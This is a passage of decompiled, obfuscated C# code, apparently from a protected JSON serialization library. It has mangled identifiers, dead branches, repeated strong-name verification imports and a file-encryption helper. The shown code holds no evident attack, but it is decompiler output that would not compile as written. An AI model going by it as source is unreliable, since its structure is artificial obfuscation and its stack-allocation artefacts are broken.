          obj0.\u0001 = \u0012.\u0007.\u0001.\u000F;
          if (true)
          {
            \u0014.\u0006.\u0001(JsonContainerType.Constructor, obj0);
            return;
          }
          goto case JsonToken.EndObject;
        case JsonToken.PropertyName:
          obj0.\u0001 = \u0012.\u0007.\u0001.\u0003;
          obj0.\u0001.\u0001 = (string) obj2;
          return;
        case JsonToken.Comment:
          return;
        case JsonToken.Raw:
        case JsonToken.Integer:
        case JsonToken.Float:
        case JsonToken.String:
        case JsonToken.Boolean:
        case JsonToken.Null:
        case JsonToken.Undefined:
        case JsonToken.Date:
        case JsonToken.Bytes:
          if (true)
          {
            \u0014.\u0006.\u0001(obj0, obj3);
            return;
          }
          break;
        case JsonToken.EndObject:
          \u0014.\u0006.\u0001(obj0, JsonToken.EndObject);
          return;
        case JsonToken.EndArray:
          \u0014.\u0006.\u0001(obj0, JsonToken.EndArray);
          return;
        case JsonToken.EndConstructor:
          \u0014.\u0006.\u0001(obj0, JsonToken.EndConstructor);
          return;
        default:
          return;
      }
      \u0014.\u0006.\u0001(JsonContainerType.Array, obj0);
    }

    static void \u0001([In] \u0013.\u000F.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      if (false)
        return;
      while (true)
      {
        int num1 = obj2;
        int num2;
        while (true)
        {
          num2 = num1 - 1;
          if (false)
            num1 = num2;
          else
            break;
        }
        obj2 = num2;
        if (num1 > 0)
        {
          byte[] numArray = obj0.\u0001;
          \u0013.\u000F.\u0003 obj = obj0;
          int num3;
          int num4 = num3 = obj.\u0001;
          obj.\u0001 = num3 + 1;
          int index = num4;
          int num5 = (int) obj0.\u0001[obj1++];
          numArray[index] = (byte) num5;
          obj0.\u0001 &= (int) short.MaxValue;
          int num6 = obj1;
          if (true)
            num6 &= (int) short.MaxValue;
          obj1 = num6;
        }
        else
          break;
      }
    }

    static void \u0001([In] \u0012.\u0007 obj0, [In] \u000E.\u0002 obj1)
    {
      if (obj1 >= \u000E.\u0002.\u0001)
      {
        while (obj1 <= \u000E.\u0002.\u0003)
        {
          do
          {
            obj0.\u0001 = obj1;
          }
          while (false);
          if (true)
            return;
        }
      }
      throw new ArgumentOutOfRangeException(\u0014.\u0006.\u0082(4207));
    }

    static bool \u0001([In] JsonToken obj0)
    {
      switch (obj0)
      {
        case JsonToken.Integer:
        case JsonToken.Float:
        case JsonToken.String:
        case JsonToken.Boolean:
        case JsonToken.Null:
        case JsonToken.Undefined:
        case JsonToken.Date:
        case JsonToken.Bytes:
          return true;
        default:
          return false;
      }
    }

    static short \u0001([In] \u0015.\u0013 obj0)
    {
      \u0006.\u0005 obj = \u0014.\u0006.\u0001(obj0);
      if (obj == null || !\u0014.\u0006.\u0001(false, \u0015.\u0013.\u0002, (\u0015.\u0013) obj))
        throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(13947), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj0)));
      return \u0014\u0004.\u0007\u0008(obj.\u0001, (IFormatProvider) \u0098.\u0002\u0004());
    }

    static \u0012.\u0015 \u0001([In] string obj0) => \u0014.\u0006.\u0001(obj0, (\u000F.\u0007) null);

    static void \u0001([In] JsonWriter obj0, [In] \u0012.\u0007 obj1, [In] int obj2, [In] bool obj3, [In] bool obj4, [In] bool obj5)
    {
      int num1;
      int num2;
      do
      {
        if (!obj4 || obj1.\u0001() != JsonToken.StartConstructor || !\u008E\u0002.\u0007\u0006(global::\u0001.\u007E\u0001(obj1.\u0001()), \u0014.\u0006.\u0082(17547), StringComparison.Ordinal))
        {
          if (obj1.\u0001() != JsonToken.Comment | obj5)
          {
            JsonToken jsonToken = obj1.\u0001();
            object obj;
            do
            {
              obj = obj1.\u0001();
            }
            while (false);
            \u0014.\u0006.\u0001(obj, obj0, jsonToken);
          }
        }
        else
          goto label_9;
label_6:
        num1 = obj2 - 1;
        num2 = obj1.\u0001();
        if (true)
        {
          int num3 = \u0014.\u0006.\u0001(obj1.\u0001()) ? 1 : 0;
          int num4 = num2 - num3;
          int num5 = num1 < num4 ? 1 : 0;
          num2 = obj3 ? 1 : 0;
          num1 = num5;
        }
        continue;
label_9:
        \u0014.\u0006.\u0001(obj0, obj1);
        goto label_6;
      }
      while ((num1 & num2) != 0 && obj1.\u0001());
    }

    static \u0012.\u0011<string, object> \u0001([In] \u0006.\u0003 obj0, [In] object obj1)
    {
      \u0016.\u0008 obj;
      switch (obj1)
      {
        case \u0016.\u0008 _:
          obj = (\u0016.\u0008) obj1;
          break;
        case \u0010.\u0007 _:
          if (true)
          {
            obj = \u0014.\u0006.\u0001((\u0010.\u0007) obj1);
            break;
          }
          break;
        default:
          throw new JsonException(\u0014.\u0006.\u0082(17556));
      }
      return \u0014.\u0006.\u0001(obj);
    }

    static void \u0001([In] \u0010.\u0006 obj0, [In] JsonWriter obj1, [In] System.Type obj2, [In] object obj3)
    {
      string str = \u0014.\u0006.\u0001(obj3, obj1, obj0);
      if (((\u0016.\u0008) obj0).\u0001 != null && ((\u0016.\u0008) obj0).\u0001.\u0001() >= TraceLevel.Verbose)
        goto label_2;
label_1:
      obj1.\u0001(\u0014.\u0006.\u0082(9822), false);
      obj1.\u0004(str);
      return;
label_2:
      ((\u0016.\u0008) obj0).\u0001.\u0001(TraceLevel.Verbose, \u0011.\u0002.\u0001((\u000F.\u0001) null, \u0014.\u0006.\u0001(obj1), \u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17633), (IFormatProvider) \u0098.\u0002\u0004(), (object) str, (object) obj2)), (Exception) null);
      goto label_1;
    }

    static void \u0001([In] \u0012.\u0007 obj0)
    {
      if (false)
        return;
      if (!obj0.\u0004())
        goto label_7;
label_6:
      obj0.\u0001 = \u0012.\u0007.\u0001.\u0001;
      return;
label_7:
      obj0.\u0001 = \u0012.\u0007.\u0001.\u0012;
      if (true)
      {
        if (false)
          ;
      }
      else
        goto label_6;
    }

    static void \u0001([In] JsonWriter obj0) => obj0.\u0002(JsonToken.Comment);

    static void \u0001([In] \u0013.\u000F.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      if ((obj0.\u0002 += obj1) > 32768)
        throw new InvalidOperationException();
      int sourceIndex = obj0.\u0001 - obj2 & (int) short.MaxValue;
      int num = 32768 - obj1;
      if (sourceIndex <= num && obj0.\u0001 < num)
      {
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0001, obj1);
          obj0.\u0001 += obj1;
        }
        else
        {
          while (obj1-- > 0)
            obj0.\u0001[obj0.\u0001++] = obj0.\u0001[sourceIndex++];
        }
      }
      else
        \u0014.\u0006.\u0001(obj0, sourceIndex, obj1, obj2);
    }

    static unsafe int \u0001([In] \u0013.\u000F.\u0003 obj0, [In] \u0013.\u000F.\u0002 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      int val1 = obj2;
      int val2 = 32768;
      if (val2 != 0)
        val2 -= obj0.\u0002;
      obj2 = Math.Min(Math.Min(val1, val2), \u0014.\u0006.\u0001(obj1));
      *(int*) ((IntPtr) voidPtr + 4) = 32768 - obj0.\u0001;
      if (obj2 > *(int*) ((IntPtr) voidPtr + 4))
      {
        *(int*) voidPtr = \u0014.\u0006.\u0001(obj1, obj0.\u0001, obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
          *(int*) voidPtr = *(int*) voidPtr + \u0014.\u0006.\u0001(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
      }
      else
        *(int*) voidPtr = \u0014.\u0006.\u0001(obj1, obj0.\u0001, obj0.\u0001, obj2);
      obj0.\u0001 = obj0.\u0001 + *(int*) voidPtr & (int) short.MaxValue;
      obj0.\u0002 += *(int*) voidPtr;
      return *(int*) voidPtr;
    }

    static void \u0001([In] int obj0, [In] char[] obj1, [In] int obj2, [In] int obj3)
    {
label_6:
      int num1;
      for (int index = obj0--; index != 0; index = num1)
      {
        obj1[obj3 + obj0] = (char) (obj2 % 10 + 48);
        num1 = obj2;
        while (true)
        {
          int num2 = num1 / 10;
          if (false)
          {
            num1 = num2;
          }
          else
          {
            obj2 = num2;
            goto label_6;
          }
        }
      }
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0015.\u0013 obj0, [In] \u0015.\u0013 obj1) => obj0.\u0002 = obj1;

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] \u0012.\u0007 obj1,
      [In] object obj2,
      [In] CultureInfo obj3,
      [In] \u0016.\u0007 obj4,
      [In] System.Type obj5)
    {
      if ((object) obj5 == null || (object) \u0014.\u0006.\u0001(obj2) == (object) obj5)
        return obj2;
      if (obj2 == null && obj4.\u0001)
        return (object) null;
      try
      {
        if (!obj4.\u0002)
          return \u0014.\u0006.\u0001(obj2, obj3, obj4.\u0001);
        \u0005.\u0008 obj = (\u0005.\u0008) obj4;
        if (obj4.\u0003)
        {
          if (obj2 is string)
            return \u0015\u0004.\u0008\u0008(obj4.\u0001, global::\u0001.\u007E\u0001(obj2), true);
          if (\u0014.\u0006.\u0001((object) obj.\u0001()))
            return \u008F\u0003.\u0080\u0007(obj4.\u0001, obj2);
        }
        return \u0016\u0004.\u000E\u0008(obj2, obj4.\u0001, (IFormatProvider) obj3);
      }
      catch (Exception ex)
      {
        throw \u0014.\u0006.\u0001(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17690), (IFormatProvider) \u0098.\u0002\u0004(), (object) \u0014.\u0006.\u0001(obj2), (object) obj5), ex, obj1);
      }
    }

    static object \u0001([In] JsonProperty obj0)
    {
label_0:
      while ((object) obj0.\u0001 != null)
      {
        do
        {
          if (true)
          {
            int num1 = obj0.\u0001 ? 1 : 0;
            int num2;
            while (true)
            {
              if (num1 == 0)
              {
                if (true)
                {
                  num2 = obj0.\u0002 ? 1 : 0;
                  if (false)
                    num1 = num2;
                  else
                    break;
                }
                else
                  goto label_7;
              }
              else
                goto label_13;
            }
            if (num2 == 0)
              obj0.\u0001 = \u0014.\u0006.\u0001(obj0.\u0001);
            else
              goto label_13;
label_7:;
          }
          else
            goto label_0;
        }
        while (false);
        if (true)
          obj0.\u0002 = true;
        else
          break;
label_13:
        return obj0.\u0001;
      }
      return (object) null;
    }

    static void \u0001(ref string _param0, [Out] string _param1, out string _param2)
    {
label_0:
      if (false)
        goto label_3;
      else
        goto label_10;
label_1:
      int? nullable;
      if (!nullable.HasValue)
      {
        if (true)
        {
          if (false)
            return;
          _param2 = _param1;
          goto label_8;
        }
        else
          goto label_0;
      }
      else
        _param2 = global::\u0001.\u007E\u0004((object) \u0080.\u007E\u001B\u0003((object) _param1, 0, nullable.GetValueOrDefault()));
label_3:
      _param0 = global::\u0001.\u007E\u0004((object) \u0080.\u007E\u001B\u0003((object) _param1, nullable.GetValueOrDefault() + 1, \u001F.\u007E\u0011\u0003((object) _param1) - nullable.GetValueOrDefault() - 1));
      if (true)
        return;
label_8:
      if (true)
      {
        _param0 = (string) null;
        return;
      }
      goto label_1;
label_10:
      nullable = \u0014.\u0006.\u0001(_param1);
      goto label_1;
    }

    static object \u0001([In] object obj0, [In] CultureInfo obj1, [In] System.Type obj2)
    {
      while (true)
      {
        // ISSUE: type reference
        if ((object) obj2 == (object) \u0004\u0002.\u0084\u0004(__typeref (object)))
          return obj0;
        if (obj0 == null)
        {
          if (true)
          {
            if (true)
            {
              if (\u0014.\u0006.\u0001(obj2))
                break;
            }
            else
              goto label_7;
          }
          else
            continue;
        }
        while (true)
        {
          object obj;
          if (\u0014.\u0006.\u0001(obj0, obj1, obj2, out obj))
          {
            if (true)
              return obj;
          }
          else
            goto label_7;
        }
        break;
label_7:
        return \u0014.\u0006.\u0001(obj0, \u0014.\u0006.\u0001(obj0), obj2);
      }
      return (object) null;
    }

    static void \u0001([In] object obj0, [In] MemberInfo obj1, [In] object obj2)
    {
      if (true)
      {
        if (true)
        {
          \u0014.\u0006.\u0001((object) obj1, \u0014.\u0006.\u0082(8901));
          goto label_13;
        }
      }
      else
        goto label_13;
label_2:
      MemberTypes memberTypes;
      while (true)
      {
        if (true)
        {
          if (memberTypes != MemberTypes.Field)
          {
            if (true)
            {
              if (memberTypes != MemberTypes.Property)
                throw new ArgumentException(\u0002.\u0002.\u0001(\u0014.\u0006.\u0082(17747), (IFormatProvider) \u0098.\u0002\u0004(), (object) global::\u0001.\u007E\u000E((object) obj1)), \u0014.\u0006.\u0082(8901));
              \u0017\u0004.\u007E\u000F\u0008((object) (PropertyInfo) obj1, obj2, obj0, (object[]) null);
              return;
            }
          }
          else
          {
            \u0086\u0002.\u007E\u009A\u0005((object) (FieldInfo) obj1, obj2, obj0);
            break;
          }
        }
        else
          goto label_13;
      }
      if (true)
        return;
      goto label_14;
label_13:
      \u0014.\u0006.\u0001(obj2, \u0014.\u0006.\u0082(17330));
label_14:
      memberTypes = \u0015.\u000E.\u0001(obj1);
      goto label_2;
    }

    static bool \u0001([In] \u0011.\u0008 obj0)
    {
      if (!obj0.\u0001.HasValue)
        goto label_26;
label_25:
      return obj0.\u0001.GetValueOrDefault();
label_26:
      obj0.\u0001 = new bool?(false);
      if (obj0.\u0001().GetValueOrDefault(\u0015.\u0004.\u0001) == \u0015.\u0004.\u0001)
      {
        IEnumerator<JsonProperty> enumerator = obj0.\u0001().GetEnumerator();
        try
        {
          int num;
          do
          {
            \u0008.\u0004? nullable1;
            if (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
            {
              \u0008.\u0004? nullable2;
              if (true)
              {
                JsonProperty current = enumerator.Current;
                if (\u0014.\u0006.\u0001(current) == \u0015.\u0004.\u0001)
                  nullable2 = current.\u0001();
                else
                  break;
              }
              else
                goto label_12;
label_6:
              num = 2;
label_7:
              \u0008.\u0004 obj1;
              \u0008.\u0004? nullable3;
              if (num != 0)
              {
                obj1 = (\u0008.\u0004) num;
                if (!nullable2.HasValue)
                {
                  if (true)
                  {
                    \u0008.\u0004? nullable4 = new \u0008.\u0004?();
                    if (true)
                    {
                      nullable3 = nullable4;
                      goto label_13;
                    }
                    else
                      goto label_6;
                  }
                  else
                    goto label_15;
                }
              }
              else
                goto label_18;
label_12:
              nullable3 = new \u0008.\u0004?(nullable2.GetValueOrDefault() & obj1);
label_13:
              nullable1 = nullable3;
              num = 2;
              \u0008.\u0004 obj2;
              if (num != 0)
                obj2 = (\u0008.\u0004) num;
              else
                goto label_7;
label_15:
              if (nullable1.GetValueOrDefault() != obj2)
              {
                num = 0;
                goto label_18;
              }
            }
            else
              goto label_21;
label_17:
            num = nullable1.HasValue ? 1 : 0;
label_18:
            continue;
label_21:
            if (false)
              goto label_17;
            else
              goto label_25;
          }
          while (num == 0);
          obj0.\u0001 = new bool?(true);
          goto label_25;
        }
        finally
        {
          if (enumerator != null)
            global::\u0011.\u007E\u0007\u0002((object) enumerator);
        }
      }
      else
      {
        obj0.\u0001 = new bool?(true);
        goto label_25;
      }
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001(
      [In] JsonProperty obj0,
      [In] \u0010.\u0006 obj1,
      [In] \u0016.\u0007 obj2,
      [In] JsonProperty obj3,
      [In] JsonWriter obj4,
      [In] object obj5,
      [In] \u0006.\u0002 obj6)
    {
      obj4.\u0002();
      bool? nullable = \u0014.\u0006.\u0001(obj1, obj2, obj0, obj6, obj3);
      int num1;
      int num2;
      if (!nullable.HasValue)
      {
        int num3 = 1;
        if (num3 != 0)
        {
          num1 = \u0014.\u0006.\u0001((\u0012.\u0003) num3, ((\u0016.\u0008) obj1).\u0001.\u0001, obj1) ? 1 : 0;
          goto label_6;
        }
        else
        {
          num2 = num3;
          goto label_9;
        }
      }
label_5:
      num1 = nullable.GetValueOrDefault() ? 1 : 0;
label_6:
      if (num1 != 0)
      {
        if (obj0 != null)
          num2 = obj0.\u0003() ? 1 : 0;
        else
          goto label_10;
      }
      else
        goto label_12;
label_9:
      if (num2 == 0)
        goto label_12;
label_10:
      if (true)
        \u0014.\u0006.\u0001(obj1, obj4, obj2.\u0002(), obj5);
      else
        goto label_5;
label_12:
      if (!\u0014.\u0006.\u0001(obj1, \u0006.\u0001.\u0002, obj2, obj0, obj6, obj3))
        return;
      \u0014.\u0006.\u0001(obj2.\u0002(), obj4, obj1);
    }

    static \u0001.\u0004 \u0001([In] IConvertible obj0) => \u0004.\u0006.\u0001[(int) \u0018\u0004.\u007E\u0010\u0008((object) obj0)];

    static void \u0001([In] string obj0, [In] SymmetricAlgorithm obj1, [In] string obj2)
    {
      byte[] numArray1 = new byte[65536];
      byte[] numArray2;
      if (true)
        numArray2 = numArray1;
      FileStream fileStream1 = new FileStream(obj0, FileMode.Open);
      try
      {
        FileStream fileStream2 = new FileStream(obj2, FileMode.Create);
        try
        {
          CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, \u0007\u0004.\u007E\u009B\u0007((object) obj1), CryptoStreamMode.Write);
          try
          {
            int num1;
            do
            {
              int num2 = \u0008\u0004.\u007E\u009C\u0007((object) fileStream1, numArray2, 0, numArray2.Length);
              num1 = num2;
              if (true)
              {
                if (num1 != 0)
                  \u000E\u0004.\u007E\u009D\u0007((object) cryptoStream, numArray2, 0, num2);
                num1 = num2;
              }
            }
            while (num1 != 0);
          }
          finally
          {
            if (cryptoStream != null)
              global::\u0011.\u007E\u0007\u0002((object) cryptoStream);
          }
        }
        finally
        {
          if (fileStream2 != null)
            global::\u0011.\u007E\u0007\u0002((object) fileStream2);
        }
      }
      finally
      {
        if (fileStream1 != null)
          global::\u0011.\u007E\u0007\u0002((object) fileStream1);
      }
    }

    static \u0008.\u0004 \u0001([In] \u0016.\u0001 obj0)
    {
      \u0008.\u0004? nullable = obj0.\u0001;
      int num = nullable.HasValue ? 1 : 0;
      if (false)
        return (\u0008.\u0004) num;
      return num == 0 ? \u0008.\u0004.\u0001 : nullable.GetValueOrDefault();
    }

    static int \u0001([In] bool obj0, [In] \u0011.\u0003 obj1) => \u0014.\u0006.\u0001(obj1, obj0, 0);

    static char \u0001([In] \u0005.\u0004 obj0) => obj0.\u0002;

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0012.\u0015.\u0001 obj0)
    {
      if (true)
      {
        if (true)
        {
          // ISSUE: reference to a compiler-generated field
          obj0.\u0001 = -1;
          goto label_6;
        }
        else
          goto label_6;
      }
label_3:
      // ISSUE: reference to a compiler-generated field
      global::\u0011.\u007E\u0007\u0002((object) obj0.\u0001);
label_4:
      if (true)
        return;
label_6:
      // ISSUE: reference to a compiler-generated field
      if (obj0.\u0001 == null)
        goto label_4;
      else
        goto label_3;
    }

    static void \u0001([In] \u0016.\u0007 obj0, [In] object obj1, [In] StreamingContext obj2)
    {
label_0:
      if (obj0.\u0001 == null)
        goto label_11;
label_1:
      if (true)
      {
        if (true)
        {
          IEnumerator<\u0008.\u000E> enumerator = obj0.\u0001.GetEnumerator();
          try
          {
            while (\u0015\u0002.\u007E\u009E\u0004((object) enumerator))
            {
              if (true)
                enumerator.Current(obj1, obj2);
              else
                break;
            }
          }
          finally
          {
            if (enumerator != null)
              global::\u0011.\u007E\u0007\u0002((object) enumerator);
          }
        }
      }
      else
        goto label_0;
label_11:
      if (true)
      {
        if (false)
          goto label_1;
      }
      else
        goto label_0;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static void \u0001([In] \u0013.\u0007 obj0, [In] \u0016.\u0011 obj1)
    {
      \u0014.\u0006.\u0001(obj0, obj1);
      obj1.\u0001(obj0);
    }

    static bool \u0001(
      string _param0,
      \u0004.\u0001 _param1,
      string _param2,
      CultureInfo _param3,
      out DateTime _param4)
    {
label_0:
      int num1 = \u001F.\u007E\u0011\u0003((object) _param0);
      int num2;
      while (true)
      {
        if (num1 > 0)
        {
          int num3 = (int) \u001B\u0002.\u007E\u0088\u0005((object) _param0, 0);
          int num4 = 47;
          if (num4 != 0)
          {
            if (num3 != num4)
            {
              int num5 = \u001F.\u007E\u0011\u0003((object) _param0);
              num4 = 19;
              num3 = num5;
              goto label_11;
            }
          }
          else
            goto label_11;
label_4:
          int num6 = \u001F.\u007E\u0011\u0003((object) _param0);
          int num7 = 9;
label_6:
          if (num6 >= num7)
          {
            if (true)
            {
              if (!\u0097.\u007E\u0001\u0004((object) _param0, \u0014.\u0006.\u0082(17828), StringComparison.Ordinal) || !\u0097.\u007E\u009F\u0003((object) _param0, \u0014.\u0006.\u0082(17837), StringComparison.Ordinal) || !\u0014.\u0006.\u0001(_param1, new \u0015.\u0008(\u009C.\u007E\u0011\u0004((object) _param0), 0, \u001F.\u007E\u0011\u0003((object) _param0)), out _param4))
                goto label_17;
              else
                break;
            }
            else
              goto label_22;
          }
          else
            goto label_17;
label_11:
          if (num3 >= num4 && \u001F.\u007E\u0011\u0003((object) _param0) <= 40 && \u009A.\u000E\u0004(\u001B\u0002.\u007E\u0088\u0005((object) _param0, 0)))
          {
            if (true)
            {
              int num8 = (int) \u001B\u0002.\u007E\u0088\u0005((object) _param0, 10);
              int num9 = 84;
              if (num9 == 0)
              {
                num7 = num9;
                num6 = num8;
                goto label_6;
              }
              else if (num8 == num9 && \u0093\u0003.\u0084\u0007(_param0, \u0014.\u0006.\u0082(17842), (IFormatProvider) \u0098.\u0002\u0004(), DateTimeStyles.RoundtripKind, ref _param4))
                goto label_15;
            }
            else
              goto label_0;
          }
label_17:
          if (!global::\u0007.\u009E(_param2) && \u0014.\u0006.\u0001(_param1, _param0, ref _param4, _param2, _param3))
          {
            if (false)
              goto label_4;
            else
              goto label_19;
          }
        }
        if (true)
          _param4 = new DateTime();
        else
          goto label_16;
label_22:
        num2 = 0;
        if (num2 != 0)
          num1 = num2;
        else
          goto label_5;
      }
      return true;
label_15:
      _param4 = \u0014.\u0006.\u0001(_param4, _param1);
label_16:
      return true;
label_19:
      return true;
label_5:
      return num2 != 0;
    }

    [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool \u0001([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

    static string \u0001([In] string obj0)
    {
      string str;
      \u0014.\u0006.\u0001(ref str, out string _, obj0);
      return str;
    }

    static void \u0001(
      [In] \u0010.\u0006 obj0,
      [In] JsonWriter obj1,
      [In] object obj2,
      [In] \u0016.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] \u0006.\u0002 obj5,
      [In] JsonProperty obj6)
    {
      if (obj2 == null)
      {
        obj1.\u0008();
      }
      else
      {
        \u0005.\u0005 obj7 = obj4?.\u0001();
        if (obj7 == null)
        {
          \u0005.\u0005 obj8;
          if (obj6 == null)
          {
            if (true)
              obj8 = (\u0005.\u0005) null;
            else
              goto label_15;
          }
          else
            goto label_21;
label_5:
          obj7 = obj8 ?? obj5?.\u0001() ?? obj3.\u0002() ?? \u0014.\u0006.\u0001(((\u0016.\u0008) obj0).\u0001, obj3.\u0002()) ?? obj3.\u0003();
          goto label_6;
label_21:
          obj8 = obj6.\u0003();
          goto label_5;
        }
label_6:
        \u0005.\u0005 obj9 = obj7;
        if (obj9 != null && obj9.\u0001())
        {
          \u0014.\u0006.\u0001(obj3, obj9, obj5, obj6, obj0, obj1, obj2);
          return;
        }
        switch (obj3.\u0001)
        {
          case \u0003.\u0005.\u0002:
            \u0014.\u0006.\u0001(obj0, obj1, obj2, (\u0011.\u0008) obj3, obj4, obj5, obj6);
            return;
          case \u0003.\u0005.\u0003:
            \u0001.\u0007 obj10 = (\u0001.\u0007) obj3;
            if (!obj10.\u0001())
            {
              \u0014.\u0006.\u0001(obj10, (IEnumerable) obj2, obj1, obj0, obj5, obj4, obj6);
              return;
            }
            \u0014.\u0006.\u0001(obj0, obj1, (Array) obj2, obj10, obj4, obj5, obj6);
            return;
          case \u0003.\u0005.\u0004:
            \u0014.\u0006.\u0001(obj0, obj1, obj2, (\u0005.\u0008) obj3, obj4, obj5, obj6);
            return;
          case \u0003.\u0005.\u0005:
            break;
          case \u0003.\u0005.\u0006:
            \u0003.\u0006 obj11 = (\u0003.\u0006) obj3;
            \u0014.\u0006.\u0001(obj0, obj1, obj2 is IDictionary ? (IDictionary) obj2 : (IDictionary) \u0014.\u0006.\u0001(obj11, obj2), obj11, obj4, obj5, obj6);
            return;
          case \u0003.\u0005.\u0007:
            return;
          case \u0003.\u0005.\u0008:
            \u0014.\u0006.\u0001(obj0, obj1, (ISerializable) obj2, (\u0005.\u0007) obj3, obj4, obj5, obj6);
            return;
          case \u0003.\u0005.\u000E:
            ((\u0015.\u0013) obj2).\u0001(obj1, ((\u0016.\u0008) obj0).\u0001.\u0001().ToArray<\u0005.\u0005>());
            return;
          default:
            return;
        }
label_15:
        \u0014.\u0006.\u0001(obj0, obj1, obj2, (\u0012.\u0014) obj3);
      }
    }

    static void \u0001([In] \u0013.\u0007 obj0, [In] \u0004.\u0013 obj1, [In] string obj2)
    {
label_0:
      List<\u0013.\u0008> objList = obj1.\u0001;
      \u0013.\u0008 obj = new \u0013.\u0008();
      obj.\u0001(new \u0004.\u0014((object) obj2, false));
      obj.\u0001(obj0);
      objList.Add(obj);
      do
      {
        if (true)
        {
          obj0.\u0001((\u0013.\u0007) obj1);
          if (true)
          {
            if (false)
              goto label_0;
          }
        }
        else
          goto label_0;
      }
      while (false);
    }

    static unsafe object \u0001(
      [In] JsonSerializerInternalReader obj0,
      [In] IList obj1,
      [In] \u0012.\u0007 obj2,
      [In] \u0001.\u0007 obj3,
      [In] JsonProperty obj4,
      [In] string obj5)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
      object obj6 = obj1 is \u000E.\u0006 obj7 ? obj7.\u0001() : (object) obj1;
      switch (obj5)
      {
        case null:
          if (\u0015\u0002.\u007E\u009D\u0004((object) obj1))
          {
            \u0014.\u0006.\u0001(obj2);
            return obj6;
          }
          if (true)
          {
            \u0014.\u0006.\u0001(obj0, obj2, (\u0016.\u0007) obj3, obj6);
            *(int*) voidPtr = obj2.\u0001();
            if (((\u0006.\u0002) obj3).\u0001 == null)
              \u0014.\u0006.\u0001((\u0006.\u0002) obj3, \u0014.\u0006.\u0001(obj0, obj3.\u0001()));
            \u0005.\u0005 obj8 = \u0014.\u0006.\u0001(obj0, ((\u0006.\u0002) obj3).\u0001, (\u0005.\u0005) null, (\u0006.\u0002) obj3, obj4);
            int? nullable1 = new int?();
            *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
            do
            {
              try
              {
                int num;
                for (int index = \u0014.\u0006.\u0001(obj0, obj2, ((\u0006.\u0002) obj3).\u0001, obj8 != null) ? 1 : 0; index != 0; index = num)
                {
                  if (obj2.\u0001() == JsonToken.EndArray)
                  {
                    *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
                    goto label_21;
                  }
                  else
                  {
                    object obj9 = obj8 == null || !obj8.\u0002() ? \u0014.\u0006.\u0001(obj0, obj2, obj3.\u0001(), ((\u0006.\u0002) obj3).\u0001, (JsonProperty) null, (\u0006.\u0002) obj3, obj4, (object) null) : \u0014.\u0006.\u0001(obj0, obj8, obj2, obj3.\u0001(), (object) null);
                    num = \u001E\u0002.\u007E\u008D\u0005((object) obj1, obj9);
                    if (true)
                      goto label_21;
                  }
                }
                break;
              }
              catch (Exception ex)
              {
                \u0011.\u0002 obj10 = \u0014.\u0006.\u0001(obj2, *(int*) voidPtr);
                object obj11 = (object) obj10.\u0001;
                if (\u0014.\u0006.\u0001(obj2.\u0001(), obj6, obj11, ex, obj2 as \u000F.\u0001, (\u0016.\u0007) obj3, (\u0016.\u0008) obj0))
                {
                  \u0014.\u0006.\u0001(obj2, obj0, *(int*) voidPtr, true);
                  if (nullable1.HasValue)
                  {
                    int? nullable2 = nullable1;
                    *(int*) ((IntPtr) voidPtr + 4) = obj10.\u0001;
